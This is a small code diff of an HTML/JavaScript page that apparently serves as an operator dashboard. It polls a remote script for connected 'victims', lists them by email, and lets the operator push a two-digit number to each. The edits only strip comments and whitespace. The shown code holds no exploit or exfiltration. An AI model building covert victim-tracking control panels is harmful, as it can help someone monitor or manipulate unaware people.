@@ -26,7 +26,7 @@
       fetch(`${SCRIPT_URL}?getVictims=true`)
         .then(r => r.json())
         .then(victims => {
-          console.log("Dashboard received victims:", victims); // Debug log
+          console.log("Dashboard received victims:", victims);
           document.getElementById("victims-container").innerHTML = victims.length === 0
             ? "<p>No victims connected yet.</p>"
             : victims.map(v => `
@@ -45,7 +45,7 @@
     function set(email) {
       const val = document.getElementById(`n-${email}`).value.trim();
       if (!/^\d{2}$/.test(val)) return alert("Enter 2 digits (10-99)");
-      
+
       console.log("Setting number for", email, "to", val);
 
       fetch(SCRIPT_URL, {
@@ -64,7 +64,7 @@
     }
 
     setInterval(refresh, 5000);
-    refresh(); // Initial load
+    refresh();
   </script>
 </body>
 </html>
